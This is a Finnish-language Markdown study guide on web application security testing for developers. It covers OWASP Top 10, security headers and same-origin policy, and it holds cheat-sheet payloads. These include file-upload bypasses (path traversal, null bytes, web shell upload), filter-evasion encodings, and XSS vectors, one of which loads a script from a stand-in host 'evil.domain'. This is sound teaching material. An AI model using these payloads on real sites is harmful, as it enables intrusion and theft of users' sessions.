# Kyber, lyhyt oppimäärä

Tästä materiaalipankista saat perustietoa verkkosovelluksen tietoturvasta ja sen testaamisesta. Materiaali on valikoitu ja tiivistetty palvelemaan ensisijaisesti ohjelmistokehittäjiä, jotka haluavat tehdä turvallisia järjestelmiä. Materiaalin tarkoitus on tukea omatoimista penetraatiotestausta järjestelmän laadunvarmistuksessa ja tietoturvallisuuden testaamisessa.

HUOM: Muista että tietomurron yrittäminenkin on rangaistava teko! Älä tee luvatonta tietoturvatestausta muiden järjestelmille. 


# Perusasiat web-sovellusten tietoturvasta

Perustiedot ja työkalujen peruskäyttöä koskeva materiaali on koottu erilliseen dokumenttiin: [Perusasiat](perusasiat.md).


# Referenssimateriaali

## OWASP Top 10 (2013)

[OWASP Top 10](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project) on lista yleisimmistä verkkosovellusten tietoturva-aukoista. OWASP-sivustolta löytyy lisätietoa aukkojen hyväksikäytöstä hyökkäyksestä ja oikeaoppisesta suojautumisesta sovelluskehittäjille.

* A1 Injection
* A2 Broken Authentication
* A3 Cross-Site Scripting (XSS)
* A4 Insecure Direct Object references
* A5 Security Misconfiguration
* A6 Sensitive Data Exposure
* A7 Missing Function Level Access Control
* A8 Cross-Site Request Forgery (CSRF)
* A9 Using Components with Known Vulnerabilities
* A10 Unvalidated Redirects and Forwards


## Autentikoinnin tarkastuslista

* Onko tunniste satunnainen, siten että sitä ei voi arvata tai päätellä?
* Voiko tunnistetta ohjata hyökkääjän haltuun jotenkin? (HttpOnly ja secure -flagit?)
* Voiko käyttäjän puolesta tehdä pyyntöjä sovellukseen? (CSRF-esto käytössä?)
* Voiko sovelluksen tarkastusta käyttäjätunnuksesta/salasanasta manipuloida?

## Same-origin policy

Kts. [Wikipedian artikkeli](https://en.wikipedia.org/wiki/Same-origin_policy)

|URL|Lopputulos|Syy|
|--|:---:|---:|
|http://www.example.com/dir/page2.html|Ok|Sama protokolla, host ja portti|
|http://www.example.com/dir2/other.html|Ok|Sama protokolla, host ja portti|
|http://username:password@www.example.com/dir2/other.html|Ok|Sama protokolla, host ja port|
|http://www.example.com:81/dir/other.html|Epäonnistuu|Sama protokolla, host, mutta eri portti|
|https://www.example.com/dir/other.html|Epäonnistuu|Eri protokolla|
|http://en.example.com/dir/other.html|Epäonnistuu|Eri host|
|http://example.com/dir/other.html|Epäonnistuu|Eri host (vaaditaan tarkka vastaavuus)|
|http://v2.www.example.com/dir/other.html|Epäonnistuu|Eri host (vaaditaan tarkka vastaavuus)|
|http://www.example.com:80/dir/other.html|Epäselvä|Portti määritelty. Riippuu selaimesta.|

## File upload

Käyttäjältä saatu tiedosto voi sisältää haittaohjelman tai viruksen, tekijänoikeuksia tai muita lakeja loukkaavaa materiaalia ja lisäksi toiminnallisuutena on vaikea suojata tiedostojen käsittelyä täysin oikein. Ison tiedoston lähettäminen voi kaataa sovelluspalvelimen.

* Onnistuuko ajettavan skriptin upload? (WebShell-backdoor.php)
* ```filename``` attribuutin manipulointi (```*```, ```?```, ```;```, ```../../etc/passwd``` yms)
* ```null byte``` (```0x00```) käyttö esim. filename-kentän suojauksen ohittamiseen
* ```virus.exe.jpg``` vs. ```virus.jpg``` vs. ```virus.exe```
* ```x.php``` -> ```test.jpg/x.php```
* Ajettavaa koodia formaatin kautta (SVG, DOC, Excel, XML)
* ```Content-type``` attribuutin manipulointi
* Purettavan ```ZIP, TAR, GZ``` yms. sisällä sopiva polku, esim. ```../../backdoor.php```
* ```PDF``` on myös ZIP ja paljon muuta.
* ```imagemagick``` tai muun taustaohjelman hyväksikäyttö


## HTTP headerit

|Header|Mikä se on?| Selaintuki | Suositeltava arvo, miksi? | Muuta? |
|------|-----------|:-----------:|:----------------------:|------:|
X-Content-Type-Options: nosniff|Estää selainta arvaamasta uudelleen MIME-typeä.|Chrome, IE8|kokoelma-hederi.|http://stackoverflow.com/questions/18337630/what-is-x-content-type-options-nosniff|
|Content-Type |MIME-type.| | | |
|Content-Disposition|Liitetiedostojen erottamiseen sisällöstä, joka näytetään selaimessa.|||Tiedostonimen kanssa on oltava tarkkana.||Keep-Alive| | | | |
|X-Frame-Options:SAMEORIGIN| Estää sovelluksen avaamisen frameen mielivaltaisesta domainista.| |SAMEORIGIN, ellei ole erityistä syytä sallia iframeja kaikkialta, estetään ne.|http://en.wikipedia.org/wiki/Clickjacking|
|Cookie + secure| Salaa cookien. Toimii vain jos on HTTPS| |https://www.owasp.org/index.php/SecureFlag|
|cookie + HTTP Only| Cookien käsittely javascriptilla estetty.| | | https://www.owasp.org/index.php/HttpOnly|
|Same-Site|CSRF-esto|Chrome, Opera| lax (strict jossain tapauksissa)|https://www.owasp.org/index.php/SameSite |
|Strict-Transport-Security| Ohjeistaa selainta käyttämään aina HTTPS:ää. Ignoroidaan HTTP:tä käytettäessä.|Muut kuin IE||http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security|
|Cache-Control|IE:n kanssa monenlaisia ongelmia luvassa. Voi toimia myös eri tavalla HTTPS-protokollassa.| | | |
|X-XSS-Protection|Ehdottaa selaimelle, että sisällössä voi olla potentiaalisesti XSS sisältöä.|IE, Chrome, Safari| 1 (jos sivulla näytetään käyttäjän sisältöä), selain voi tämän perusteella käynnistää XSS filtterinsä.|OWASP-ZAP antaa low-tason varoituksen tämän puuttumisesta.|
|X-Forwarded-For|Reverse proxy asettaa tämän. Tätä ei pitäisi hyväksyä käyttäjän selaimelta, koska se voi aiheuttaa ongelmia.| | Vastaava myös x-forwarded-host|
|Content-Security-Policy|Voi asettaa rajoituksia sille mitä sisältöä selain voi ladata.| | | Katso https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy|
|Access-Control-Allow-Origin|Mahdollistaa same-origin policyn kiertämisen (CORS)|* poistaa rajoituksen kokonaan, ei hyvä idea.| | |https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS |
|Upgrade-Insecure-Requests|Käytetään HTTPS-protokollaa HTTP:n sijaan automaattisesti.|muut paitsi IE|1|https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Upgrade-Insecure-Requests|

Yksityiskohtia selainten tarjoamasta tuesta: [Can I Use?](http://www.caniuse.com/#compare=ie+11,edge+16,firefox+58,chrome+64,safari+11,opera+49&compare_cats=Security)
 

## Enkoodaukset

Eri tilanteissa web-sovellukset enkoodaavat sisältöä eri tavoilla. Erilaisten suodattimien ja tarkistusten ohittaminen edellyttää joskus erilaisten enkoodausten hyväksikäyttöä. Tässä on yhteenveto ja esimerkkejä.

* normaali: ```alert(1)```
* Javascript, Octal: ```\141\154\145\162\164\50\61\51```
* HTML, hex: ```&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;```
* HTML, decimal: ```&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;```
* Javascript,HEX: ```\x61\x6c\x65\x72\x74\x28\x31\x29```
* Javascript, unicode ```\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029```
* Javascript, Unicode ```\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}\u{0028}\u{0031}\u{0029}```
* URL: ```%61%6c%65%72%74%28%31%29```
* Base64

### Javascript, puolipiste-enkoodauksen ohitus

Myös tämä on sallittu tapa enkoodata asioita joskus.

```
&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041
```

Lisätietoa:
* Javascriptin enkoodaukset: https://mathiasbynens.be/notes/javascript-escapes
* HTML enkoodaukset: https://mathiasbynens.be/notes/ambiguous-ampersands
* Erikoismerkit verkko-osoitteissa: [Punycode](https://en.wikipedia.org/wiki/Punycode)


## Javascriptin ajaminen

Javascriptin ujuttamiseen ajoon on useita eri tapoja jos sovelluksessa on huolimattomuuden takia jonkinlainen XSS-aukko tai muu ongelma. Tässä on listattu joitakin:

* ```<script>alert(1)</script>```
* ```<script src="http://evil.domain/hak.js"/>```
* Viallinen HTML, esim. ```<scr<script>ipt>alert('XSS')</scr<script>ipt>```
* ```<img src="lol.jpg" onError=alert(1)>```
* onLoad, onChange yms. vastaavasti
* ```<img src=x onerror=alert('XSS')//``` - kommentin hyväksikäyttö
* ```<img src=x:alert(alt) onerror=eval(src) alt=xss>```
* ```<svg/onload=alert(1)>``` SVG-kuvaformaatin hyväksikäyttö + event handler.
* ```<svg id=alert(1) onload=eval(id)>```
* ```<input autofocus onfocus=alert(1)>```
* ```<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">```
* XML-dokumentin sisällä (CDATA ja muita keinoja)
* SVG-kuvan käyttö alustana (CDATA + script)
* JSON-rakenteen sisällä
* lainausmerkit voi jättää pois tai korvata heittomerkillä. Jossain tilanteissa myös käänteisellä heittomerkillä.

Lisätietoa:
* https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection
* https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
* https://html5sec.org/


## Erikoiset URL:t

Selaimet tunnistavat useita URL-osoitteita, jotka eivät ole normaaleja verkko-osoitteita ja niitä voidaan hyötykäyttää. Riippuu selaimen ja tietokoneen asetuksista mitä kaikkea voidaan tehdä, mutta tässä on joitakin esimerkkejä.

* data:text/html - esimerkiksi ```data:text/html,<script>alert(1)</script>```
* ```javascript:alert(1)```
* ```http://;URL=javascript:alert(1)```
* Base64-enkoodauksen hyväksikäyttö: ```data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+```
* ```mailto:```  -sähköpostin lähetys
* ```callto:```  -puhelinsoitto (esimerkiksi maksulliseen numeroon)
* ```tel:``` - puhelinsoitto (esimerkiksi maksulliseen numeroon)
* ```file://``` - tiedostojärjestelmä paikallisen koneen levyllä

Data-tyyppistä "verkko-osoitetta" voidaan käyttää myös dynaamisesti kuvien tai äänen muodostamiseen verkkosivulla jos HTML-koodissa osoitetaan datasisältö sen avulla.

Lisätietoa:
* https://github.com/ouspg/urlhandlers

## Parametrien käsittely

Parametrien käsittelyssä tehdyt ohjelmointivirheet ovat yleinen tapa hyödyntää sovelluksen virhettä. Tässä on esimerkkejä asioista joita voit kokeilla:

## Parametrien käsittelyn rikkominen

* Parametrin jättäminen pois
* Arvon korvaaminen (jonkun muun id, -1,  tms..)
* Saman parametrin toistaminen useita kertoja eri arvoilla, [HTTP Parameter Pollution](https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004))
* Erikoisarvot: ```null```, ```nil```, ```NaN```, lukualueiden ääriarvot
* Erikoismerkit: ```'```, ```%``` ja muut
* Arvojen lisääminen pyynnön mukana. Hyväksyykö sovellus myös ylimääräisiä kenttiä?
* Ylipitkän arvon käyttö.
* välilyöntien käyttö alussa tai lopussa


## Piilotetut elementit käyttöliittymässä

* ```form``` elementin hidden-kentät.
* CSS-tyylien kautta piilotetut
* Position avulla piilotus

# Lisenssi

![lisenssi](88x31.png)

Creative Commons, Attribution-NonCommercial CC BY-NC
Kts. [LISENSSI](LICENSE).

